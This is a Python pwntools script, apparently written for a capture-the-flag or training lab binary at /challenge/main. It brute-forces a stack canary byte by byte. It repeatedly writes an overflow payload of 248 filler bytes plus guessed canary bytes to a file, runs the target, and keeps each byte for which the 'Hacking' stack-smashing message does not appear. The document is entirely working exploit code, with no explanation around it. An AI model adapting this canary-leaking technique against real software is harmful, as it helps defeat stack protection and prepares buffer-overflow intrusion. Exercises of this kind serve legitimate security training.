import os
import sys
from pwn import *

def gussCanary(c,b):
    data=b'/tmp/43\x00'+b'a'*c+b
    print(data)
    f = open("/home/hacker/input43", mode='wb+')
    f.write(data)
    f.close()

if __name__=='__main__':
    os.system("touch /tmp/43")
    main = "/challenge/main fffff < /home/hacker/input43"
    char = 0
    rs = []
    for l in range(0,8):
        flag = 0
        for i in range(0,256):
            char = i
            gussCanary(248,bytes(rs)+i.to_bytes(length=1,byteorder='little',signed=False))
            f = os.popen(main,'r',1)
            data = f.buffer.read()
            str = data.decode(encoding="utf-8")
            if str.find("Hacking")==-1:
                flag = 1
                break
        if flag == 0:
            print("Error!No find any char!")
            exit(-1);
        rs.append(char)
        print("char:%s" % (bytes(rs).hex()))
